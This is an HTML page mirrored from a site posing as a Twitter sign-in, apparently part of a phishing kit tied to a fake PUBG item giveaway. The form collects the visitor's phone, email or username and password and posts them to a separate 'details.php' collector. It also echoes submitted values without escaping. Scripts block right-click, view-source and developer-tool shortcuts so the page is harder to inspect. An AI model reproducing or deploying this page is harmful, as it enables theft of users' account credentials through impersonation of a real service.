
<html>

<!-- Mirrored from itemspubgs8.jkub.com/login/twitter/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Aug 2019 05:05:48 GMT -->
<head>
<title>Twitter</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<link rel="stylesheet" href="css/twitter.css">
<body class="body">

<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>



</br>
<center>
<img width="40" src="img/twitter.png">
<h4>Sign in to Twitter</h4>
</center>

<div class="login-box">
<form action="../details.php" method="post">
<input type="text" name="email" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="prov" value="Twitter">
<input type="hidden" name="nick" value="<?= $_POST['nick'] ?>">
<input type="hidden" name="uid" value="<?= $_POST['uid'] ?>">
    <button type="submit" class="btn-login">Sign In</button>
  </form>
		</div>
    



</body>

<!-- Mirrored from itemspubgs8.jkub.com/login/twitter/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Aug 2019 05:05:48 GMT -->
</html>
<!--- script by raflipedia indonesia --->